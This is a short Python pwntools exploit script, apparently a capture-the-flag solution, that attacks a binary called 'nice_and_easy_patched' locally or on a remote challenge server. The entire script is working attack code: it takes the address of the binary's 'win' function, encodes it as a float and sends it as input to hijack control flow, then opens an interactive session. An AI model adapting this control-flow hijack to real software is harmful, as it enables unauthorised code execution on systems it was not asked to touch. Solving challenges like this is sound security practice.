#!/usr/bin/env python3

from pwn import *

exe = ELF("./nice_and_easy_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("challenges.cybersecuritychallenge.pt", 23101)

    return r


def main():
    r = conn()

    win_addr = exe.symbols["win"]                 # 0x401247
    f = struct.unpack("<f", struct.pack("<I", win_addr & 0xFFFFFFFF))[0]
    log.info(f"win @ {hex(win_addr)}  -> float {f!r}")

    r.sendlineafter(b"Where do you wanna go? ", str(f).encode())
    r.recvuntil(b"Jumping to: ")
    log.info("Jumped to: " + r.recvline().decode().strip())
    print(r.recvall(timeout=3).decode(errors="replace"))

    r.interactive()


if __name__ == "__main__":
    main()
